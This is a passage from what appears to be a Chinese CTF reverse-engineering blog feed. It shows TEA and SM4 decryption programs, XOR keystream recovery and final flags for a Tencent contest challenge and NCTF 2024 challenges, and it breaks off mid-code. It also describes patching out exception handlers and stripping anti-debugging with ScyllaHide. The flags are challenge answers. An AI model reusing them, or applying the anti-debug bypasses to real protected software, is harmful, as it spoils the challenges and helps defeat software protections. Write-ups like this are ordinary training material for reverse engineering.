class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 魔改tea解密函数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">tea_decrypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> *Input, <span class="type">int</span> *Key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v6 = Input[<span class="number">0</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v8 = Input[<span class="number">1</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    sum = (<span class="number">-0x61C88647</span>) * <span class="number">32</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        v8 -= (sum + Key[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]) ^ (v6 + ((v6 &lt;&lt; <span class="number">4</span>) ^ (v6 &gt;&gt; <span class="number">5</span>)));</span><br><span class="line">        v6 -= (sum + v8) ^ (Key[<span class="number">0</span>] + (v8 &lt;&lt; <span class="number">4</span>)) ^ (Key[<span class="number">1</span>] + (v8 &gt;&gt; <span class="number">5</span>));</span><br><span class="line">        sum += <span class="number">0x61C88647</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Input[<span class="number">0</span>] = v6;</span><br><span class="line">    Input[<span class="number">1</span>] = v8;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// flag密文</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> enc[<span class="number">42</span>] = &#123;</span><br><span class="line">    <span class="number">0x0EC367B8</span>, <span class="number">0xC9DA9044</span>, <span class="number">0xDA6C2DEB</span>, <span class="number">0x88DDC9C3</span>, <span class="number">0x32A01575</span>, <span class="number">0x231DD0B4</span>, <span class="number">0x4B9E8A74</span>, <span class="number">0xD75D3E74</span>,</span><br><span class="line">    <span class="number">0xEAAB8712</span>, <span class="number">0xE704E888</span>, <span class="number">0xE01A31AC</span>, <span class="number">0xECAE205C</span>, <span class="number">0xA7BE7467</span>, <span class="number">0x0C6252A3</span>, <span class="number">0x1AEFEC4E</span>, <span class="number">0xC40DED44</span>,</span><br><span class="line">    <span class="number">0xC3C842CC</span>, <span class="number">0xDE4A0C0E</span>, <span class="number">0x7C24F3FC</span>, <span class="number">0x8FB8D001</span>, <span class="number">0x11153E6E</span>, <span class="number">0x530ED15C</span>, <span class="number">0xF4214811</span>, <span class="number">0xBEB517E0</span>,</span><br><span class="line">    <span class="number">0x63F91634</span>, <span class="number">0x4D96F8A5</span>, <span class="number">0xFE23EAC8</span>, <span class="number">0x2C607ADF</span>, <span class="number">0xCC43D85C</span>, <span class="number">0xFF186C5B</span>, <span class="number">0x8763E1A5</span>, <span class="number">0x9187BD58</span>,</span><br><span class="line">    <span class="number">0x87D1069B</span>, <span class="number">0xD7878D7B</span>, <span class="number">0x836E6B68</span>, <span class="number">0x55A0C63F</span>, <span class="number">0xD979FDB3</span>, <span class="number">0x3E524DEE</span>, <span class="number">0x7AB35C82</span>, <span class="number">0xA2F4DA8D</span>,</span><br><span class="line">    <span class="number">0x1708BA4C</span>, <span class="number">0x710653E6</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// tea解密key</span></span><br><span class="line"><span class="type">int</span> key[<span class="number">4</span>]&#123;<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;6&#x27;</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 42个数据，2个2个进行tea解密</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">42</span>; i += <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">tea_decrypt</span>((<span class="type">unsigned</span> <span class="type">int</span> *)((DWORD64)enc + i * <span class="number">4</span>), key);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 输出42个解密后数据</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">42</span>; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%X &quot;</span>, enc[i]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Out"><a href="#Out" class="headerlink" title="Out"></a>Out</h3><p><code>33 28 13 0 2D 16 40 41 13 2A 12 4F 45 4B 1F 14 39 49 3B 34 3A 26 3B 19 24 2B 22 5 4C E 0 4C 3B 4 2B 1D 5 39 16 22 3D B</code></p><h3 id="CyberChef"><a href="#CyberChef" class="headerlink" title="CyberChef"></a>CyberChef</h3><p>xor(‘sxx’) -&gt; Reverse -&gt; Base58 Decode(换表)</p><p><img src="/2025/03/31/2025Tencent/28.png" alt="alt text"></p><p>密文：<code>We1C0me!T0Z0Z5GamESecur1t9*CTf</code></p><h2 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h2><p><code>flag&#123;ACE_We1C0me!T0Z0Z5GamESecur1t9*CTf&#125;</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;2025腾讯游戏安全技术竞赛-PC客户端安全-初赛WP&quot;&gt;&lt;a href=&quot;#2025腾讯游戏安全技术竞赛-PC客户端安全-初赛WP&quot; class=&quot;headerlink&quot; title=&quot;2025腾讯游戏安全技术竞赛 PC客户端安全 初赛WP&quot;&gt;&lt;/a&gt;2025腾</summary>
      
    
    
    
    
    <category term="CTF比赛" scheme="https://tkazer.github.io/tags/CTF%E6%AF%94%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>NCTF2024</title>
    <link href="https://tkazer.github.io/2025/03/24/NCTF2024/"/>
    <id>https://tkazer.github.io/2025/03/24/NCTF2024/</id>
    <published>2025-03-24T11:12:53.000Z</published>
    <updated>2025-03-24T13:41:39.058Z</updated>
    
    <content type="html"><![CDATA[<h1 id="NCTF-2024-Reverse-WP"><a href="#NCTF-2024-Reverse-WP" class="headerlink" title="NCTF 2024 Reverse WP"></a>NCTF 2024 Reverse WP</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这次也是擦边#6拿下奖金，组队的师傅们都十分强大，合力拿下。</p><p>Re这次摸了三题，剩一题安卓不太熟悉安卓逆向看了一眼就没做，但是赛后发现其实没那么难（。ezDOS 8086汇编题刚好撞上我GHCTF出的题，很熟悉直接秒了，偷摸了个一血。然后gogo这题的golang vm研究了挺久，拿下了三血，实际加密不是很复杂。总体下来这几题re出的都挺不错，收获也很多，对vm的题型也更加熟悉了。</p><h2 id="ezDOS"><a href="#ezDOS" class="headerlink" title="ezDOS"></a>ezDOS</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>程序中间出现的花指令都直接nop去除，然后Apply patch到程序。</p><p><img src="/2025/03/24/NCTF2024/image.png" alt="alt text"></p><p>程序要求输入38长度字符串，然后进行一系列变种类RC4算法加密，然后与0x141地址的38字节数据进行比对。</p><p><img src="/2025/03/24/NCTF2024/image-1.png" alt="alt text"></p><p>使用dosbox动调，在FA代码处是对取出的al对输入的字符串进行xor加密。0x32是取出的异或值，0x31是输入的字符’1’。</p><p><img src="/2025/03/24/NCTF2024/image-2.png" alt="alt text"></p><p><img src="/2025/03/24/NCTF2024/image-3.png" alt="alt text"></p><p>直接debug一直循环执行这边，即可拿到对输入字符串异或的一系列异或值。</p><p><code>32 7d 59 7a f3 0d b3 7b 64 8c eb 28 c4 a4 50 30 a0 ed 27 6a e3 76 69 0c da 28 f8 08 ba a6 17 3e 12 59 45 06 4e f1</code></p><p>取出0x142地址的38字节，进行异或即可得到解密flag。</p><h3 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h3><p><img src="/2025/03/24/NCTF2024/image-4.png" alt="alt text"></p><h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><p><code>NCTF&#123;Y0u+Ar3_Assemb1y_M4st3r_5d0b497e&#125;</code></p><h2 id="SafeProgram"><a href="#SafeProgram" class="headerlink" title="SafeProgram"></a>SafeProgram</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>核心加密是一个SM4加密。</p><p><img src="/2025/03/24/NCTF2024/image-5.png" alt="alt text"></p><p>查看byte_14002A0D0数组交叉引用，发现在其他函数被访问过。</p><p><img src="/2025/03/24/NCTF2024/image-6.png" alt="alt text"></p><p><img src="/2025/03/24/NCTF2024/image-7.png" alt="alt text"></p><p>发现是在VEH异常Handler里面调用的，第一个AddVectoredExceptionHandler得直接nop，不然运行就直接退出。</p><p><img src="/2025/03/24/NCTF2024/image-8.png" alt="alt text"></p><p><img src="/2025/03/24/NCTF2024/image-9.png" alt="alt text"></p><p><img src="/2025/03/24/NCTF2024/image-10.png" alt="alt text"></p><p>然后在这个函数开头断点，使用ScyllaHide插件一键去除反调试，防止其他地方的反调试。</p><p><img src="/2025/03/24/NCTF2024/image-11.png" alt="alt text"></p><p>main函数可以看到要求输入格式为NCTF{…}的长度38字符串，然后运行到箭头函数会触发除0异常，然后就会触发VEH那个Handler导致那个byte数组被修改，需要提取的数据是被改后的。</p><p><img src="/2025/03/24/NCTF2024/image-12.png" alt="alt text"></p><p>动调时提取这三个数组数据，进行解密即可。</p><p><img src="/2025/03/24/NCTF2024/image-13.png" alt="alt text"></p><p>key是main函数两次memcpy那边的数据，结果如下。</p><p><img src="/2025/03/24/NCTF2024/image-14.png" alt="alt text"></p><h3 id="解密-1"><a href="#解密-1" class="headerlink" title="解密"></a>解密</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> byte_7FF699A4A0D0[<span class="number">256</span>] = &#123;</span><br><span class="line">    <span class="number">0xD1</span>, <span class="number">0x90</span>, <span class="number">0xE9</span>, <span class="number">0xFE</span>, <span class="number">0xCC</span>, <span class="number">0xE1</span>, <span class="number">0x3D</span>, <span class="number">0xB7</span>, <span class="number">0x16</span>, <span class="number">0xB6</span>, <span class="number">0x14</span>, <span class="number">0xC2</span>, <span class="number">0x28</span>, <span class="number">0xFB</span>, <span class="number">0x2C</span>, <span class="number">0x05</span>,</span><br><span class="line">    <span class="number">0x2B</span>, <span class="number">0x67</span>, <span class="number">0x9A</span>, <span class="number">0x76</span>, <span class="number">0x2A</span>, <span class="number">0xBE</span>, <span class="number">0x04</span>, <span class="number">0xC3</span>, <span class="number">0xAA</span>, <span class="number">0x44</span>, <span class="number">0x13</span>, <span class="number">0x26</span>, <span class="number">0x49</span>, <span class="number">0x86</span>, <span class="number">0x06</span>, <span class="number">0x99</span>,</span><br><span class="line">    <span class="number">0x9C</span>, <span class="number">0x42</span>, <span class="number">0x50</span>, <span class="number">0xF4</span>, <span class="number">0x91</span>, <span class="number">0xEF</span>, <span class="number">0x98</span>, <span class="number">0x7A</span>, <span class="number">0x33</span>, <span class="number">0x54</span>, <span class="number">0x0B</span>, <span class="number">0x43</span>, <span class="number">0xED</span>, <span class="number">0xCF</span>, <span class="number">0xAC</span>, <span class="number">0x62</span>,</span><br><span class="line">    <span class="number">0xE4</span>, <span class="number">0xB3</span>, <span class="number">0x17</span>, <span class="number">0xA9</span>, <span class="number">0x1C</span>, <span class="number">0x08</span>, <span class="number">0xE8</span>, <span class="number">0x95</span>, <span class="number">0x80</span>, <span class="number">0xDF</span>, <span class="number">0x94</span>, <span class="number">0xFA</span>, <span class="number">0x75</span>, <span class="number">0x8F</span>, <span class="number">0x3F</span>, <span class="number">0xA6</span>,</span><br><span class="line">    <span class="number">0x47</span>, <span class="number">0x07</span>, <span class="number">0xA7</span>, <span class="number">0x4F</span>, <span class="number">0xF3</span>, <span class="number">0x73</span>, <span class="number">0x71</span>, <span class="number">0xBA</span>, <span class="number">0x83</span>, <span class="number">0x59</span>, <span class="number">0x3C</span>, <span class="number">0x19</span>, <span class="number">0xE6</span>, <span class="number">0x85</span>, <span class="number">0xD6</span>, <span class="number">0xA8</span>,</span><br><span class="line">    <span class="number">0x68</span>, <span class="number">0x6B</span>, <span class="number">0x81</span>, <span class="number">0xB2</span>, <span class="number">0xFC</span>, <span class="number">0x64</span>, <span class="number">0xDA</span>, <span class="number">0x8B</span>, <span class="number">0xF8</span>, <span class="number">0xEB</span>, <span class="number">0x0F</span>, <span class="number">0x4B</span>, <span class="number">0x70</span>, <span class="number">0x56</span>, <span class="number">0x9D</span>, <span class="number">0x35</span>,</span><br><span class="line">    <span class="number">0x1E</span>, <span class="number">0x24</span>, <span class="number">0x0E</span>, <span class="number">0x78</span>, <span class="number">0x63</span>, <span class="number">0x58</span>, <span class="number">0x9F</span>, <span class="number">0xA2</span>, <span class="number">0x25</span>, <span class="number">0x22</span>, <span class="number">0x7C</span>, <span class="number">0x3B</span>, <span class="number">0x01</span>, <span class="number">0x21</span>, <span class="number">0xC9</span>, <span class="number">0x87</span>,</span><br><span class="line">    <span class="number">0xD4</span>, <span class="number">0x00</span>, <span class="number">0x46</span>, <span class="number">0x57</span>, <span class="number">0x5E</span>, <span class="number">0xD3</span>, <span class="number">0x27</span>, <span class="number">0x52</span>, <span class="number">0x4C</span>, <span class="number">0x36</span>, <span class="number">0x02</span>, <span class="number">0xE7</span>, <span class="number">0xA0</span>, <span class="number">0xC4</span>, <span class="number">0xC8</span>, <span class="number">0x9E</span>,</span><br><span class="line">    <span class="number">0xEA</span>, <span class="number">0xBF</span>, <span class="number">0x8A</span>, <span class="number">0xD2</span>, <span class="number">0x40</span>, <span class="number">0xC7</span>, <span class="number">0x38</span>, <span class="number">0xB5</span>, <span class="number">0xA3</span>, <span class="number">0xF7</span>, <span class="number">0xF2</span>, <span class="number">0xCE</span>, <span class="number">0xF9</span>, <span class="number">0x61</span>, <span class="number">0x15</span>, <span class="number">0xA1</span>,</span><br><span class="line">    <span class="number">0xE0</span>, <span class="number">0xAE</span>, <span class="number">0x5D</span>, <span class="number">0xA4</span>, <span class="number">0x9B</span>, <span class="number">0x34</span>, <span class="number">0x1A</span>, <span class="number">0x55</span>, <span class="number">0xAD</span>, <span class="number">0x93</span>, <span class="number">0x32</span>, <span class="number">0x30</span>, <span class="number">0xF5</span>, <span class="number">0x8C</span>, <span class="number">0xB1</span>, <span class="number">0xE3</span>,</span><br><span class="line">    <span class="number">0x1D</span>, <span class="number">0xF6</span>, <span class="number">0xE2</span>, <span class="number">0x2E</span>, <span class="number">0x82</span>, <span class="number">0x66</span>, <span class="number">0xCA</span>, <span class="number">0x60</span>, <span class="number">0xC0</span>, <span class="number">0x29</span>, <span class="number">0x23</span>, <span class="number">0xAB</span>, <span class="number">0x0D</span>, <span class="number">0x53</span>, <span class="number">0x4E</span>, <span class="number">0x6F</span>,</span><br><span class="line">    <span class="number">0xD5</span>, <span class="number">0xDB</span>, <span class="number">0x37</span>, <span class="number">0x45</span>, <span class="number">0xDE</span>, <span class="number">0xFD</span>, <span class="number">0x8E</span>, <span class="number">0x2F</span>, <span class="number">0x03</span>, <span class="number">0xFF</span>, <span class="number">0x6A</span>, <span class="number">0x72</span>, <span class="number">0x6D</span>, <span class="number">0x6C</span>, <span class="number">0x5B</span>, <span class="number">0x51</span>,</span><br><span class="line">    <span class="number">0x8D</span>, <span class="number">0x1B</span>, <span class="number">0xAF</span>, <span class="number">0x92</span>, <span class="number">0xBB</span>, <span class="number">0xDD</span>, <span class="number">0xBC</span>, <span class="number">0x7F</span>, <span class="number">0x11</span>, <span class="number">0xD9</span>, <span class="number">0x5C</span>, <span class="number">0x41</span>, <span class="number">0x1F</span>, <span class="number">0x10</span>, <span class="number">0x5A</span>, <span class="number">0xD8</span>,</span><br><span class="line">    <span class="number">0x0A</span>, <span class="number">0xC1</span>, <span class="number">0x31</span>, <span class="number">0x88</span>, <span class="number">0xA5</span>, <span class="number">0xCD</span>, <span class="number">0x7B</span>, <span class="number">0xBD</span>, <span class="number">0x2D</span>, <span class="number">0x74</span>, <span class="number">0xD0</span>, <span class="number">0x12</span>, <span class="number">0xB8</span>, <span class="number">0xE5</span>, <span class="number">0xB4</span>, <span class="number">0xB0</span>,</span><br><span class="line">    <span class="number">0x89</span>, <span class="number">0x69</span>, <span class="number">0x97</span>, <span class="number">0x4A</span>, <span class="number">0x0C</span>, <span class="number">0x96</span>, <span class="number">0x77</span>, <span class="number">0x7E</span>, <span class="number">0x65</span>, <span class="number">0xB9</span>, <span class="number">0xF1</span>, <span class="number">0x09</span>, <span class="number">0xC5</span>, <span class="number">0x6E</span>, <span class="number">0xC6</span>, <span class="number">0x84</span>,</span><br><span class="line">    <span class="number">0x18</span>, <span class="number">0xF0</span>, <span class="number">0x7D</span>, <span class="number">0xEC</span>, <span class="number">0x3A</span>, <span class="number">0xDC</span>, <span class="number">0x4D</span>, <span class="number">0x20</span>, <span class="number">0x79</span>, <span class="number">0xEE</span>, <span class="number">0x5F</span>, <span class="number">0x3E</span>, <span class="number">0xD7</span>, <span class="number">0xCB</span>, <span class="number">0x39</span>, <span class="number">0x48</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> dword_7FF699A4A040[<span class="number">32</span>] = &#123;</span><br><span class="line">    <span class="number">0x00070E15</span>, <span class="number">0x1C232A31</span>, <span class="number">0x383F464D</span>, <span class="number">0x545B6269</span>, <span class="number">0x70777E85</span>, <span class="number">0x8C939AA1</span>, <span class="number">0xA8AFB6BD</span>, <span class="number">0xC4CBD2D9</span>,</span><br><span class="line">    <span class="number">0xE0E7EEF5</span>, <span class="number">0xFC030A11</span>, <span class="number">0x181F262D</span>, <span class="number">0x343B4249</span>, <span class="number">0x50575E65</span>, <span class="number">0x6C737A81</span>, <span class="number">0x888F969D</span>, <span class="number">0xA4ABB2B9</span>,</span><br><span class="line">    <span class="number">0xC0C7CED5</span>, <span class="number">0xDCE3EAF1</span>, <span class="number">0xF8FF060D</span>, <span class="number">0x141B2229</span>, <span class="number">0x30373E45</span>, <span class="number">0x4C535A61</span>, <span class="number">0x686F767D</span>, <span class="number">0x848B9299</span>,</span><br><span class="line">    <span class="number">0xA0A7AEB5</span>, <span class="number">0xBCC3CAD1</span>, <span class="number">0xD8DFE6ED</span>, <span class="number">0xF4FB0209</span>, <span class="number">0x10171E25</span>, <span class="number">0x2C333A41</span>, <span class="number">0x484F565D</span>, <span class="number">0x646B7279</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> dword_7FF699A4A028[<span class="number">4</span>] = &#123;</span><br><span class="line"><span class="number">0xA3B1BAC6</span>, <span class="number">0x56AA3350</span>, <span class="number">0x677D9197</span>, <span class="number">0xB27022DC</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">uint32_t</span> <span class="title">rotate_left</span><span class="params">(<span class="type">uint32_t</span> x, <span class="type">int</span> n)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (x &lt;&lt; n) | (x &gt;&gt; (<span class="number">32</span> - n));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">generate_buf</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span>* key, <span class="type">uint32_t</span>* buf)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">uint32_t</span> key_dword;</span><br><span class="line">            <span class="built_in">memcpy</span>(&amp;key_dword, key + <span class="number">4</span> * i, <span class="number">4</span>);</span><br><span class="line">            <span class="type">uint32_t</span> converted_key = ((key_dword &amp; <span class="number">0xFF</span>) &lt;&lt; <span class="number">24</span>) |</span><br><span class="line">            ((key_dword &amp; <span class="number">0xFF00</span>) &lt;&lt; <span class="number">8</span>) |</span><br><span class="line">            ((key_dword &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF00</span>) |</span><br><span class="line">            ((key_dword &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span>);</span><br><span class="line">            buf[i] = dword_7FF699A4A028[i] ^ converted_key;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span>; j++) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">uint32_t</span> v12 = dword_7FF699A4A040[j] ^ buf[j + <span class="number">3</span>] ^ buf[j + <span class="number">2</span>] ^ buf[j + <span class="number">1</span>];</span><br><span class="line">            <span class="type">uint8_t</span>* v12_bytes = (<span class="type">uint8_t</span>*)&amp;v12;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">4</span>; k++)</span><br><span class="line">                &#123;</span><br><span class="line">                    v12_bytes[k] = byte_7FF699A4A0D0[v12_bytes[k]];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">uint32_t</span> rot1 = <span class="built_in">rotate_left</span>(v12, <span class="number">23</span>);</span><br><span class="line">        <span class="type">uint32_t</span> rot2 = <span class="built_in">rotate_left</span>(v12, <span class="number">13</span>);</span><br><span class="line">        buf[j + <span class="number">4</span>] = (rot1 ^ rot2 ^ v12) ^ buf[j];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">decrypt</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span>* ciphertext, <span class="type">const</span> <span class="type">uint8_t</span>* key, <span class="type">uint8_t</span>* plaintext)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> buf[<span class="number">36</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="type">uint32_t</span> buf_1[<span class="number">36</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">generate_buf</span>(key, buf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> ii = <span class="number">0</span>; ii &lt; <span class="number">4</span>; ii++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">uint32_t</span> cipher_dword;</span><br><span class="line">        <span class="built_in">memcpy</span>(&amp;cipher_dword, ciphertext + <span class="number">4</span> * ii, <span class="number">4</span>);</span><br><span class="line">        buf_1[<span class="number">35</span> - ii] = ((cipher_dword &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span>) |</span><br><span class="line">            ((cipher_dword &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF00</span>) |</span><br><span class="line">            ((cipher_dword &lt;&lt; <span class="number">8</span>) &amp; <span class="number">0xFF0000</span>) |</span><br><span class="line">            ((cipher_dword &lt;&lt; <span class="number">24</span>) &amp; <span class="number">0xFF000000</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> m = <span class="number">31</span>; m &gt;= <span class="number">0</span>; m--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">uint32_t</span> v12_0 = buf[m + <span class="number">4</span>] ^ buf_1[m + <span class="number">3</span>] ^ buf_1[m + <span class="number">2</span>] ^ buf_1[m + <span class="number">1</span>];</span><br><span class="line">        <span class="type">uint8_t</span>* v12_bytes = (<span class="type">uint8_t</span>*)&amp;v12_0;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> n = <span class="number">0</span>; n &lt; <span class="number">4</span>; n++) </span><br><span class="line">        &#123;</span><br><span class="line">            v12_bytes[n] = byte_7FF699A4A0D0[v12_bytes[n]];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">uint32_t</span> rot1 = <span class="built_in">rotate_left</span>(v12_0, <span class="number">24</span>);</span><br><span class="line">        <span class="type">uint32_t</span> rot2 = <span class="built_in">rotate_left</span>(v12_0, <span class="number">18</span>);</span><br><span class="line">        <span class="type">uint32_t</span> rot3 = <span class="built_in">rotate_left</span>(v12_0, <span class="number">10</span>);</span><br><span class="line">        <span class="type">uint32_t</span> rot4 = <span class="built_in">rotate_left</span>(v12_0, <span class="number">2</span>);</span><br><span class="line">        <span class="type">uint32_t</span> L_result = rot1 ^ rot2 ^ rot3 ^ rot4 ^ v12_0;</span><br><span class="line">        buf_1[m] = buf_1[m + <span class="number">4</span>] ^ L_result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">uint32_t</span> v11 = buf_1[i];</span><br><span class="line">        <span class="type">uint8_t</span> b0 = (v11 &gt;&gt; <span 